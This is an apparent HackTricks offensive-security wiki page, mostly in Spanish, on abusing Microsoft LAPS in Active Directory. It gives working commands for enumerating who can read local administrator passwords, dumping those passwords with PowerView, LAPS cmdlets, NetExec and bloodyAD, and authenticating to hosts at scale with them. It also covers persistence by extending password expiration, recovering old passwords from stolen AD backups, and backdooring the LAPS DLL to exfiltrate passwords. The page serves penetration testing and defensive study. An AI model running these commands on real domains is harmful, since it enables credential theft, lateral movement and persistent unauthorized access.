# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Información básica

Actualmente hay **2 variantes de LAPS** que puedes encontrar durante una assessment:

- **Legacy Microsoft LAPS**: almacena la contraseña del administrador local en **`ms-Mcs-AdmPwd`** y el tiempo de expiración en **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (integrado en Windows desde las actualizaciones de abril de 2023): todavía puede emular el modo legacy, pero en modo nativo usa atributos **`msLAPS-*`**, soporta **password encryption**, **password history** y **DSRM password backup** para domain controllers.

LAPS está diseñado para gestionar **local administrator passwords**, haciéndolas **únicas, aleatorizadas y cambiadas frecuentemente** en equipos unidos al dominio. Si puedes leer esos atributos, normalmente puedes **pivot as the local admin** al host afectado. En muchos entornos, la parte interesante no es solo leer la contraseña en sí, sino también encontrar **a quién se le delegó acceso** a los atributos de contraseña.

### Atributos de Legacy Microsoft LAPS

En los objetos de computer del dominio, la implementación de Legacy Microsoft LAPS da lugar a la adición de dos atributos:

- **`ms-Mcs-AdmPwd`**: **plain-text administrator password**
- **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**

### Atributos de Windows LAPS

Windows LAPS nativo añade varios atributos nuevos a los objetos de computer:

- **`msLAPS-Password`**: clear-text password blob almacenado como JSON cuando la encryption no está habilitada
- **`msLAPS-PasswordExpirationTime`**: hora de expiración programada
- **`msLAPS-EncryptedPassword`**: contraseña actual cifrada
- **`msLAPS-EncryptedPasswordHistory`**: historial de contraseñas cifrado
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: datos cifrados de la contraseña DSRM para domain controllers
- **`msLAPS-CurrentPasswordVersion`**: seguimiento de versión basado en GUID usado por la lógica más nueva de detección de rollback (Windows Server 2025 forest schema)

Cuando **`msLAPS-Password`** es legible, el valor es un objeto JSON que contiene el nombre de la cuenta, la hora de actualización y la contraseña en texto claro, por ejemplo:
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Verifica si está activado
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## LAPS Password Access

Podrías **descargar la política LAPS en bruto** desde `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` y luego usar **`Parse-PolFile`** del paquete [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) para convertir este archivo a un formato legible por humanos.

### Legacy Microsoft LAPS PowerShell cmdlets

Si el módulo legacy de LAPS está instalado, normalmente los siguientes cmdlets están disponibles:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Cmdlets de PowerShell de Windows LAPS

Windows LAPS nativo incluye un nuevo módulo de PowerShell y nuevos cmdlets:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
A few operational details matter here:

- **`Get-LapsADPassword`** automatically handles **legacy LAPS**, **clear-text Windows LAPS**, and **encrypted Windows LAPS**.
- If the password is encrypted and you can **read** but not **decrypt** it, the cmdlet returns metadata such as **`Source`**, **`DecryptionStatus`**, and **`AuthorizedDecryptor`** even when it can't return the clear-text password.
- In **encrypted Windows LAPS**, **read permission** and **decrypt permission** are **different controls**. Having OU / object read access doesn't automatically mean you can decrypt **`msLAPS-EncryptedPassword`**.
- **Password history** is only available when **Windows LAPS encryption** is enabled.
- On domain controllers, the returned source can be **`EncryptedDSRMPassword`**.

This is useful during an assessment because the **`AuthorizedDecryptor`** field tells you **which user or group the blob was encrypted for**, often turning a failed password read into a new privilege-escalation target.

### PowerView / LDAP

**PowerView** can also be used to find out **who can read the password and read it**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Si **`msLAPS-Password`** es legible, analiza el JSON devuelto y extrae **`p`** para la contraseña y **`n`** para el nombre de la cuenta de administrador local gestionada.
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
Ese campo **`n`** importa en implementaciones más nuevas porque **Windows LAPS automatic account management** puede apuntar a una **cuenta personalizada** en lugar del **`Administrator`** integrado, y los sistemas más recientes **Windows 11 24H2 / Windows Server 2025** incluso pueden **randomize** ese nombre de cuenta.

### Linux / remote tooling

Las herramientas modernas soportan tanto el Microsoft LAPS heredado como Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Notas:

- Las compilaciones recientes de **NetExec** soportan **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** y **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** sigue siendo útil para el **legacy Microsoft LAPS** desde Linux, pero solo apunta a **`ms-Mcs-AdmPwd`**.
- Herramientas multiplataforma más recientes como **`LAPS4LINUX`**, tooling basado en **`dpapi-ng`** y workflows recientes de **NetExec** también pueden manejar **native Windows LAPS** desde hosts no Windows.
- Si el entorno usa **encrypted Windows LAPS**, una simple lectura LDAP no es suficiente; también necesitas ser un **authorized decryptor** (o material de decryption equivalente, como material offline de la clave raíz DPAPI-NG del domain).
- En **Windows 11 24H2 / Windows Server 2025**, no asumas que el administrador local gestionado siempre es **`Administrator`**. La administración automática de cuentas puede crear una cuenta personalizada y, opcionalmente, aleatorizar su nombre, así que descubre primero el nombre de la cuenta mediante **`n`** / **`Account`** antes de usar **`--laps`** a gran escala.

### Directory synchronization abuse

Si tienes derechos de **directory synchronization** a nivel de domain en lugar de acceso directo de lectura sobre cada objeto de computer, LAPS aún puede ser interesante.

La combinación de **`DS-Replication-Get-Changes`** con **`DS-Replication-Get-Changes-In-Filtered-Set`** o **`DS-Replication-Get-Changes-All`** puede usarse para sincronizar atributos **confidential / RODC-filtered** como el legacy **`ms-Mcs-AdmPwd`**. BloodHound modela esto como **`SyncLAPSPassword`**. Revisa [DCSync](dcsync.md) para el contexto de los replication-rights.

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilita la enumeración de LAPS con varias funciones.\
Una de ellas es analizar **`ExtendedRights`** para **todos los computers con LAPS habilitado.** Esto muestra **groups** específicamente **delegados para leer passwords de LAPS**, que a menudo son users en protected groups.\
Un **account** que ha **unido un computer** a un domain recibe `All Extended Rights` sobre ese host, y este right le da al **account** la capacidad de **leer passwords**. La enumeración puede mostrar una user account que puede leer el LAPS password en un host. Esto puede ayudarnos a **target specific AD users** que pueden leer passwords de LAPS.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Extrayendo contraseñas de LAPS con NetExec / CrackMapExec

Si no tienes un PowerShell interactivo, puedes abusar de este privilegio de forma remota a través de LDAP:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Esto volcará todos los secretos de LAPS que el usuario puede leer, permitiéndote moverte lateralmente con una contraseña de administrador local diferente.

## Using LAPS Password
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## Persistencia de LAPS

### Fecha de expiración

Una vez admin, es posible **obtener las contraseñas** y **evitar** que una máquina **actualice** su **contraseña** **estableciendo la fecha de expiración en el futuro**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS usa **`msLAPS-PasswordExpirationTime`** en su lugar:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> La contraseña seguirá rotando si un **admin** usa **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, o si **Do not allow password expiration time longer than required by policy** está habilitado.

### Advertencia de rollback de snapshot en Windows LAPS más reciente

Los trucos antiguos de rollback de snapshot / imagen son **menos fiables** contra implementaciones recientes de **Windows LAPS**. En **Windows 11 24H2 / Windows Server 2025**, si el schema del forest incluye **`msLAPS-CurrentPasswordVersion`** (**Windows Server 2025 forest schema**), el cliente compara un GUID cacheado localmente con el valor almacenado en AD e **rota inmediatamente la contraseña** cuando un rollback crea un **torn state**.

En la práctica, esto significa que la persistencia basada en snapshots o los intentos de revivir una contraseña local de admin anterior conocida pueden desaparecer rápidamente en lugar de sobrevivir hasta la siguiente expiración normal.

Esta protección solo se aplica a **AD-backed Windows LAPS** y aún depende de que la máquina revertida pueda **autenticarse de vuelta contra AD**. Si la máquina ya no puede hablar con AD, **password history** o **AD backup access** aún podrían salvar la situación.

### Advertencia sobre manipulación de la gestión automática de cuentas

Cuando la **automatic account management** está habilitada, Windows LAPS controla el ciclo de vida de la cuenta local de admin gestionada. Los intentos inesperados de renombrar, reconfigurar o de otro modo manipular esa cuenta pueden ser rechazados con **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`**, por lo que la persistencia que depende de modificar silenciosamente la cuenta LAPS gestionada es menos fiable en endpoints más recientes.

### Recuperación de contraseñas históricas desde backups de AD

Cuando **Windows LAPS encryption + password history** está habilitado, los backups de AD montados pueden convertirse en una fuente adicional de secretos. Si puedes acceder a un snapshot de AD montado y usar **recovery mode**, puedes consultar contraseñas almacenadas más antiguas sin hablar con un DC en vivo.
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Esto es mayormente relevante durante **AD backup theft**, **offline forensics abuse**, o **disaster-recovery media access**.

### Backdoor

El código fuente original para legacy Microsoft LAPS se puede encontrar [aquí](https://github.com/GreyCorbel/admpwd), por lo tanto es posible poner un backdoor en el código (dentro del método `Get-AdmPwdPassword` en `Main/AdmPwd.PS/Main.cs`, por ejemplo) que de alguna manera **exfiltrate nuevas contraseñas o las almacene en algún lugar**.

Luego, compila el nuevo `AdmPwd.PS.dll` y súbelo a la máquina en `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (y cambia la hora de modificación).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
